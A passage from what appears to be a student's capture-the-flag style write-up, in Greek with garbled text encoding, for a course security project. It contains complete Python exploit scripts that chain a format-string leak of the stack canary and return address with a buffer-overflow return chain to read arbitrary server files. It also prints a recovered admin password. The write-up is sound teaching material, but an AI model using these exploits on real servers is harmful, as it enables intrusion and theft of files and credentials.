       # the return address of check_auth() from reposnse headers
       url = 'http://localhost:' + argv[1] + '/'
 
       username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
       input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
       response = requests.request("GET", url, headers=input_headers)
       text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()
 
       # Building the payload
       canary   = text_obj[-3]
       ebp      = text_obj[-2]
       ret_addr = text_obj[-1]
      
       offset_srv_ulti = 0x870
       offset_safe_ret = 0x169 
 
       canary   = struct.pack('<L', int(canary  , base=16))
       svd_ebp  = struct.pack('<L', int(ebp     , base=16))
       srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
       safe_ret = struct.pack('<L', int(ret_addr, base=16) + offset_safe_ret)
 
       binary_payload = BytesIO()
       binary_payload.write(("p" * 100).encode("utf-8"))
       binary_payload.write(canary)
       binary_payload.write(("p" * 8).encode("utf-8"))
       binary_payload.write(svd_ebp)
       binary_payload.write(srv_ulti)
       binary_payload.write(safe_ret)
 
       # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
       url = 'http://localhost:' + argv[1] + '/ultimate.html'
       authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
       headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
       response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)
 
       print(response.text)

      # ------------------------------------------------------
      # Run: python3 bof.py <port>
      # eg.: python3 bof.py 8000
       ```
 
       </p>
    </details><br/>
    
    Î•Ï„ÏƒÎ¹, Ï€ÎµÏ„ÏÏ‡Î±Î¼Îµ Î½Î± Ï€Î±Î¯ÏÎ½Î¿Ï…Î¼Îµ Ï„Î¿ **ultimate.html** Î¬Î¼ÎµÏƒÎ± ÎºÎ±Î¹ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ Ï„Î¿ Ï€Î±Î¹Î´Î¯ Î½Î± Ï„ÎµÏÎ¼Î±Ï„Î¯Î¶ÎµÎ¹ Î¿Î¼Î±Î»Î¬ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î±Ï†Î®Î½Î¿Ï…Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ Î¯Ï‡Î½Î¿Ï‚ ÏŒÏ€Ï‰Ï‚ Î­Î½Î± segmentation fault.
    
    ÎœÎ­ÏƒÏ‰ Î±Ï…Ï„Î¿Ï Î»Î¿Î¹Ï€ÏŒÎ½, Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î± ***Preliminary Results of Plan Y***!
    
    &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/25-Ultimate_Data.png)

---
---

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 4 (Code of Plan Z)

1. Î‘ÏÏ‡Î¹ÎºÎ¬ ÎµÎ¯Î´Î±Î¼Îµ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ _ultimate.html_ Ï€Î¿Ï… Ï€Î®ÏÎ±Î¼Îµ Î±Ï€ÏŒ Ï„Î¿ Ï€Î¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ Î²Î®Î¼Î±, ÏŒÏ„Î¹ Î³Î¯Î½ÎµÏ„Î±Î¹ Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ **z.log**, Î¬ÏÎ± Î­Ï€ÏÎµÏ€Îµ Î½Î± 
   Ï€Î¬ÏÎ¿Ï…Î¼Îµ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î¿Ï… Î³Î¹Î± Ï„Î¿ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿ Î²Î®Î¼Î±.

2. ÎˆÏ„ÏƒÎ¹, ÏƒÎºÎµÏ†Ï„Î®ÎºÎ±Î¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î· ÎºÎ»Î®ÏƒÎ· Ï„Î·Ï‚ **`send_file()`** Î¼Îµ ÏŒÏÎ¹ÏƒÎ¼Î± Ï„Î¿ **z.log**, Ï‰ÏƒÏ„Îµ Î½Î± Î¼Î±Ï‚ Ï„Î¿ ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ ÏŒÏ€Ï‰Ï‚ ÏƒÏ„Î¬Î»Î¸Î·ÎºÎµ Ï„Î¿ _ultimate.html_.

   Î ÏÏÏ„Î± Ï…Ï€Î¿Î»Î¿Î³Î¯ÏƒÎ±Î¼Îµ Ï„Î± ÎºÎ±Î¹Î½Î¿ÏÏÎ³Î¹Î± offsets. Î’ÏÎ®ÎºÎ±Î¼Îµ Ï„Î·Î½ Î±Ï€ÏŒÏƒÏ„Î±ÏƒÎ· Ï„Î·Ï‚ Ï€ÏÏÏ„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ Ï„Î·Ï‚ **`send_file()`** Î±Ï€ÏŒ Ï„Î¿ return address Ï„Î·Ï‚ 
   `check_auth()` Î³Î¹Î± Î½Î± Ï„Î·Î½ ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î¼Îµ Î´Î¯Î½Î¿Î½Ï„Î±Ï‚ Ï„Î± Î´Î¹ÎºÎ¬ Î¼Î±Ï‚ Î¿ÏÎ¯ÏƒÎ¼Î±Ï„Î± ÎºÎ±Î¹ Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ Ï„Î·Ï‚ ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î± safe Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· 
   ÏÏƒÏ„Îµ Î½Î± Î±Ï€Ï†ÏÎ³Î¿Ï…Î¼Îµ Ï„Î¿ segmentation fault. Î•Ï€Î¯ÏƒÎ·Ï‚, Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÏƒÎ±Î¼Îµ Ï„Î¿ string Ï€Î¿Ï… Î¸Î± Î­Ï€Î±Î¹ÏÎ½Îµ ÏƒÎ±Î½ ÏŒÏÎ¹ÏƒÎ¼Î± Î· `send_file()` ÏƒÏ„Î·Î½ Î±ÏÏ‡Î® Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± 
   **char post_data[100]**. 
   
   Î Î±ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î¿Î»Î¿ÎºÎ»Î®ÏÏ‰ÏƒÎ· Ï„Î·Ï‚ `post_param()` Ï„Î¿ stack frame Ï„Î·Ï‚ Î¸Î± "Ï‡Î±Î½ÏŒÏ„Î±Î½", Î¼Î±Î¶Î¯ ÎºÎ±Î¹ Î¿ Ï„Î¿Ï€Î¹ÎºÏŒÏ‚ Ï„Î·Ï‚ Ï€Î¯Î½Î±ÎºÎ±Ï‚ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¸Î± Ï€Î±ÏÎ­Î¼ÎµÎ½Î±Î½ 
   ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± Î¸Î­ÏƒÎ· ÎºÎ±Î¹ Î¸Î± Î®Ï„Î±Î½ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î± Î±Ï€ÏŒ Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î±, ÏŒÏ€Ï‰Ï‚ ÎºÎ±Î¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÏƒÎ±Î¼Îµ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… gdb, ÎµÎ½Ï Ï€Î±ÏÎ¬Î»Î»Î·Î»Î± Î¼Îµ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· Ï„Î·Ï‚ `send_file()` 
   Î¾Î±Î½Î±Î¼Ï€Î±Î¯Î½Î¿Ï…Î½ Î±Ï…Ï„Î¬ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÏ„Î¿ ÎµÎ½ÎµÏÎ³ÏŒ stack frame Ï„Î·Ï‚. ÎˆÏ„ÏƒÎ¹, Ï€Î±ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î±Ï…Ï„Î­Ï‚ Î¿Î¹ Î¸Î­ÏƒÎµÎ¹Ï‚ Î¸Î± Î¾Î±Î½Î±Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î· `send_file()`, ÎµÎ¯Î½Î±Î¹ 
   Î±ÏÎºÎµÏ„Î¬ Ï‡Î±Î¼Î·Î»Î¬ ÎºÎ±Î¹ Î´ÎµÎ½ Ï€ÏÎ¿Î»Î±Î²Î±Î¯Î½Î¿Ï…Î½ Î½Î± Î³Î¯Î½Î¿Ï…Î½ overwrite ÎºÎ±Î¹ ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î· `fopen()` ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¬.
   
   |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
   |-|-|
   |1Î· ÎµÎ½Ï„Î¿Î»Î® Ï„Î·Ï‚ `send_file()` | **0x656** |
   |Î•Ï€Î¹ÏƒÏ„ÏÎ¿Ï†Î® Ï„Î·Ï‚ `send_file()` ÏƒÎµ safe address | **0x169**|
   |Î‘ÏÏ‡Î® Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± `post_data` ÏƒÎµ ÏƒÏ‡Î­ÏƒÎ· Î¼Îµ Ï„Î¿Î½ **ebp** Ï„Î·Ï‚ route | **0x110**|
   
   ```python
   ...
   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 8).encode("utf-8"))
   binary_payload.write(svd_ebp)
   binary_payload.write(srv_ulti)
   binary_payload.write(safe_ret)
   ...
   ```
   <details>
   <summary><b>Click here to see the full script</b></summary>
      <p>

      ```python
      import pycurl
      import struct
      import base64
      import requests

      from sys import argv
      from io  import BytesIO

      # Sending 1st payload to / for getting the canary value and
      # the return address of check_auth() from reposnse headers
      url = 'http://localhost:' + argv[1] + '/'

      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
      response = requests.request("GET", url, headers=input_headers)
      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

      # Building the payload
      canary   = text_obj[-3]
      ebp      = text_obj[-2]
      ret_addr = text_obj[-1]

      offset_srv_ulti = 0x870
      offset_safe_ret = 0x169 

      canary   = struct.pack('<L', int(canary  , base=16))
      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
      srv_ulti = struct.pack('<L', int(ret_addr, base=16) + offset_srv_ulti)
      safe_ret = struct.pack('<L', int(ret_addr, base=16) + offset_safe_ret)

      binary_payload = BytesIO()
      binary_payload.write(("p" * 100).encode("utf-8"))
      binary_payload.write(canary)
      binary_payload.write(("p" * 8).encode("utf-8"))
      binary_payload.write(svd_ebp)
      binary_payload.write(srv_ulti)
      binary_payload.write(safe_ret)

      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
      url = 'http://localhost:' + argv[1] + '/ultimate.html'
      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

      print(response.text)
      
      # ------------------------------------------------------
      # Run: python3 bof.py <port> <file_to_retrieve>
      # eg.: python3 bof.py 8000 /var/log/z.log
      ```
       
      </p>
   </details><br/>
    
3. Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏƒÏ…Î½ÎµÎ¹Î´Î·Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ±Î¼Îµ Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ Ï‡ÏÎ®ÏƒÎ· Ï€Î¿Î»Î»ÏÎ½ Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎ·Ï‚ Ï„Ï‰Î½ requests (postman, curl, python libraries), ÏŒÏ„Î¹ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± 
   ÏƒÏ„Î±Î»Î¸Î¿ÏÎ½ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… Î¸Î­Î»Î±Î¼Îµ ÎµÏ€ÎµÎ¹Î´Î® Î­Î»ÎµÎ¹Ï€Î±Î½ Ï„Î± headers Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î»Î¬Î²ÎµÎ¹ Ï€ÏÏÏ„Î± ÏƒÎ±Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Ï„Î¿ ÎºÎ¬Î¸Îµ request (eg. **HTTP/1.1 200 OK\r\n\r\n**).
   
   Î Î±ÏÏŒÎ»'Î±Ï…Ï„Î¬, Î· Ï€ÏÏÏ„Î· Î³ÏÎ±Î¼Î¼Î® ÎºÎ¬Î¸Îµ Î±ÏÏ‡ÎµÎ¯Î¿Ï… Ï€Î¿Ï… Î¶Î·Ï„Î¬Î³Î±Î¼Îµ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎ¿Ï…Î¼Îµ ÎµÏ€Î­ÏƒÏ„ÏÎµÏ†Îµ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ exception Ï€Î¿Ï… Ï€ÏÎ¿ÎºÎ±Î»Î¿ÏÏƒÎµ Î· python.
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/26-Request_Exception_Results.png)
   
   Î˜Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î¼Îµ Î»Î¿Î¹Ï€ÏŒÎ½, Î½Î± Ï†Ï„Î¹Î¬Î¾Î¿Ï…Î¼Îµ Î­Î½Î± script Ï€Î¿Ï… Î½Î± ÎºÎ¬Î½ÎµÎ¹ Ï€Î¿Î»Î»Î±Ï€Î»Î¬ requests Ï€Î±Î¯ÏÎ½Î¿Î½Ï„Î±Ï‚ Î³ÏÎ±Î¼Î¼Î® Î³ÏÎ±Î¼Î¼Î® ÎºÎ¬Î¸Îµ Î±ÏÏ‡ÎµÎ¯Î¿, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… Î²Î­Î²Î±Î¹Î± Î¸Î± Î®Ï„Î±Î½ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ±
   Î±Î½Ï„Î¹Ï€Î±ÏÎ±Î³Ï‰Î³Î¹ÎºÏŒ.
   <br/>
    
4. ÎˆÏ„ÏƒÎ¹, Î­Ï€ÏÎµÏ€Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î¼Îµ Ï€ÏÏÏ„Î± Î±Ï…Ï„Î¬ Ï„Î± headers Î³Î¹Î± Î½Î± ÎµÎ³ÎºÎ±Î¸Î¹Î´ÏÏ…Î¸ÎµÎ¯ Î· ÏƒÏÎ½Î´ÎµÏƒÎ· ÎºÎ±Î¹ Î½Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÎ¹ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ ÎºÎ±Î¹ Ï„Î± Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±.
   
   Î“Î¹Î± Î½Î± Ï„Î¿ Ï€ÎµÏ„ÏÏ‡Î¿Ï…Î¼Îµ Î±Ï…Ï„ÏŒ, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ±Î¼Îµ Ï„Î¿ attack Ï€Î¿Ï… ÎºÎ¬Î½Î±Î¼Îµ ÏƒÏ„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿ part. ÎšÎ¬Î½Î±Î¼Îµ Î±ÏÏ‡Î¹ÎºÎ¬ return ÏƒÏ„Î·Î½ `serve_ultimate()`, Î· Î¿Ï€Î¿Î¯Î± ÏƒÏ„Î­Î»Î½ÎµÎ¹ Ï„Î± 
   headers by default ÎºÎ±Î¹ Î¼Î±Î¶Î¯ ÏƒÏ„Î­Î»ÎµÎ½ÎµÎ¹ ÎºÎ±Î¹ Ï„Î¿ _ultimate.html_ ÎºÎ±Î¹ Î±ÎºÎ¿Î»Î¿ÏÎ¸Ï‰Ï‚, Î±Î½Ï„Î¯ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎ¿Ï…Î¼Îµ ÏƒÏ„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® Î±Î¼Î­ÏƒÏ‰Ï‚ Î¼ÎµÏ„Î¬ Ï„Î¿ `free()` ÏŒÏ€Ï‰Ï‚ Ï€ÏÎ¹Î½, ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†Î±Î¼Îµ
   ÏƒÏ„Î· **`send_file()`**, Î³Î¹Î± 2<sup>Î·</sup> Ï†Î¿ÏÎ¬ Ï€Î»Î­Î¿Î½, Î´Î¯Î½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ Î´Î¹ÎºÏŒ Î¼Î±Ï‚ ÎµÎºÎ¬ÏƒÏ„Î¿Ï„Îµ ÏŒÏÎ¹ÏƒÎ¼Î±.
   
   ÎšÎ¬Î½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ÏŒÎ¼Ï‰Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ string Ï€Î¿Ï… Î¸Î± Î­Ï€Î±Î¹ÏÎ½Îµ ÏƒÎ±Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿ Î· `send_file()` ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± **post_data**, Î· ÎºÎ»Î®ÏƒÎ· Ï„Î·Ï‚ `serve_ultimate()` ÎºÎ±Î¹ Î· Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® 
   Ï„Î¿Ï… _ultimate.html_ ÎºÎ¬Î½ÎµÎ¹ overwrite Ï„Î¿ ÏŒÏÎ¹ÏƒÎ¼Î¬ Î¼Î±Ï‚ ÎºÎ±Î¹ Ï„ÎµÎ»Î¹ÎºÎ¬ Î±Ï€Î¿Ï„Ï…Î³Ï‡Î¬Î½ÎµÎ¹ Ï„Î¿ attack.
   
   ÎˆÏ„ÏƒÎ¹, Î­Ï€ÏÎµÏ€Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Î­Î½Î±Î½ Î¬Î»Î»Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± Î® ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Î¸Î­ÏƒÎµÎ¹Ï‚ Î¼Î½Î®Î¼Î·Ï‚ Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎ¿Ï…Î¼Îµ Ï„Î¿ argument Ï„Î·Ï‚ `send_file()`. Î’ÏÎ®ÎºÎ±Î¼Îµ Ï„ÎµÎ»Î¹ÎºÎ¬ ÏŒÏ„Î¹ Î±ÎºÏÎ¹Î²ÏÏ‚ Ï€ÏÎ¹Î½ Ï„Î·Î½ ÎºÎ»Î®ÏƒÎ· 
   Ï„Î·Ï‚ **`post_param()`** Î´Î·Î»ÏÎ½ÎµÏ„Î±Î¹ Î­Î½Î±Ï‚ Ï€Î¯Î½Î±ÎºÎ±Ï‚ **100** Î¸Î­ÏƒÎµÏ‰Î½ ÏƒÏ„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î¼Îµ Î½Î± Î³ÏÎ¬ÏˆÎ¿Ï…Î¼Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… Î¸Î­Î»Î¿Ï…Î¼Îµ. 
   
   Î‘Ï…Ï„ÏŒÏ‚ Î¿ Ï€Î¯Î½Î±ÎºÎ±Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏ„ÎµÎ¯Ï„Î±Î¹ **0x70 = 112 bytes** ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ Ï„Î·Î½ Î±ÏÏ‡Î® Ï„Î¿Ï… stack frame Ï„Î·Ï‚ `route()`, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ ÎºÎ¿Î½Ï„Î¬ Î¼Îµ Ï„Î·Î½ Î±ÏÏ‡Î® 
   Ï„Î¿Ï… stack frame Ï„Î·Ï‚ `post_param()`, ÎºÎ±Î¸ÏÏ‚ Î±ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼Îµ **0x84 = 132 bytes**. ÎˆÏ„ÏƒÎ¹, ÎµÎ¾Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î´Îµ Î¸Î± ÎµÏ€Î¹ÎºÎ±Î»Ï…Ï†Î¸Î¿ÏÎ½ Î¹Î´Î¹Î±Î¯Ï„ÎµÏÎ± ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¬ Î´ÎµÎ´Î¿Î¼Î­Î½Î± 
   Ï„Î·Ï‚ `route()` ÎºÎ±Î¹ Î¸Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÎ¹ Î¼ÎµÏ„Î¬ Î½Î± ÏƒÏ…Î½ÎµÏ‡Î¹ÏƒÏ„ÎµÎ¯ Î· Î¿Î¼Î±Î»Î® ÎµÎºÏ„Î­Î»ÎµÏƒÎ® Ï„Î·Ï‚.
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/27-Route_Stack_Frame_Size.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/28-Admin_pwd_Position.png)|
   |-|-|
   
   |Description|Offset <br/> <sub>(from **check_auth** ret addr)</sub>|
   |-|-|
   |1Î· ÎµÎ½Ï„Î¿Î»Î® Ï„Î·Ï‚ `serve_ultimate()` | **0x870** |
   |1Î· ÎµÎ½Ï„Î¿Î»Î® Ï„Î·Ï‚ `send_file()` | **0x656** |
   |Î•Ï€Î¹ÏƒÏ„ÏÎ¿Ï†Î® Ï„Î·Ï‚ `send_file()` ÏƒÎµ safe address | **0x169**|
   |Î˜Î­ÏƒÎ· Ï„Î¿Ï… argument Î³Î¹Î± Ï„Î· `send_file()` ÏƒÎµ ÏƒÏ‡Î­ÏƒÎ· Î¼Îµ Ï„Î¿Î½ **ebp** Ï„Î·Ï‚ route | **0x8C**|
   
   ```python
   ...
   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 8).encode("utf-8"))
   binary_payload.write(svd_ebp)
   binary_payload.write(ulti_ret)
   binary_payload.write(sndf_ret)
   binary_payload.write(fin_ret)
   binary_payload.write(argument)
   binary_payload.write((argv[2] + "&").encode("utf-8"))
   ...
   ```
   <details>
   <summary><b>Click here to see the full script</b></summary>
      <p>

      ```python
      import pycurl
      import struct
      import base64
      import requests

      from sys import argv
      from io  import BytesIO

      # Sending 1st payload to / for getting the canary value and
      # the return address of check_auth() from reposnse headers
      url = 'http://localhost:' + argv[1] + '/'

      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
      response = requests.request("GET", url, headers=input_headers)
      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

      # Building the payload
      canary   = text_obj[-3]
      ebp      = text_obj[-2]
      auth_ret = text_obj[-1]

      offset_to_srv_ulti = 0x870
      offset_to_send_fl  = 0x656
      offset_to_fin_ret  = 0x169
      offset_to_pdata    = 0x8C

      canary   = struct.pack('<L', int(canary  , base=16))
      svd_ebp  = struct.pack('<L', int(ebp     , base=16))
      fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)
      sndf_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_send_fl)
      ulti_ret = struct.pack('<L', int(auth_ret, base=16) + offset_to_srv_ulti)
      argument = struct.pack('<L', int(ebp     , base=16) - offset_to_pdata)

      binary_payload = BytesIO()
      binary_payload.write(("p" * 100).encode("utf-8"))
      binary_payload.write(canary)
      binary_payload.write(("p" * 8).encode("utf-8"))
      binary_payload.write(svd_ebp)
      binary_payload.write(ulti_ret)
      binary_payload.write(sndf_ret)
      binary_payload.write(fin_ret)
      binary_payload.write(argument)
      binary_payload.write((argv[2] + "&").encode("utf-8"))

      # Sending the final request that will do the Buffer Overflow and retrieve ultimate.html
      url = 'http://localhost:' + argv[1] + '/ultimate.html'
      authentication64 = base64.b64encode(bytes('admin:you shall not pass', 'utf-8'))
      headers = {'Authorization': 'Basic ' + authentication64.decode('UTF-8')}
      response = requests.request("POST", url, headers=headers, data=binary_payload.getvalue(), timeout=None)

      # Uncomment for removing ultimate.html from output
      print(response.text)
      # print(response.text[173:])
      
      # ------------------------------------------------------
      # Run: python3 bof.py <port> <file_to_retrieve>
      # eg.: python3 bof.py 8000 /var/log/z.log
      ```
       
      </p>
   </details><br/>
   
   ÎˆÏ„ÏƒÎ¹, Ï€Î®ÏÎ±Î¼Îµ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î¿Ï… **z.log**!
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/29-Z_Log_Data.png)

<br/>

5. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï€Î®ÏÎ±Î¼Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î¿ /etc/admin_pwd Î³Î¹Î± Î½Î± Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î¼Ï€Î±Î¯Î½Î¿Ï…Î¼Îµ ÎºÎ±Î¹ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¬ ÏƒÏ„Î¿ ultimate.html Î¼Î­ÏƒÏ‰ browser.
   
   > Password: **kdje34123asdfasd23D**   
<br/>

6. ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ **z.log** Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î¸Î± Î¼Î±Ï‚ Î¿Î´Î·Î³Î¿ÏÏƒÎ±Î½ ÏƒÏ„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï„Î¿Ï… Plan_Z.

   Î¤Î¿ Ï€ÏÏÏ„Î¿ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹ Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï„Î¿ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎ±Î¼Îµ ÎµÏÎºÎ¿Î»Î±, Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Î­Î½Î± ÎµÎ¾Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬ Î¹ÏƒÏ„Î¿ÏÎ¹ÎºÏŒ ÏƒÎºÎ±ÎºÎ¹ÏƒÏ„Î¹ÎºÏŒ Ï€Î±Î¹Ï‡Î½Î¯Î´Î¹ Î¼ÎµÏ„Î±Î¾Ï 
   Ï„Î¿Ï… **Garry Kasparov** ÎºÎ±Î¹ Ï„Î¿Ï… **Deep Blue**. [<sup>\[15\]</sup>](#15--httpsenwikipediaorgwikiStack_buffer_overflowProtection_schemes)[<sup>\[16\]</sup>](#16--httpsenwikipediaorgwikiStack_buffer_overflowProtection_schemes)
   
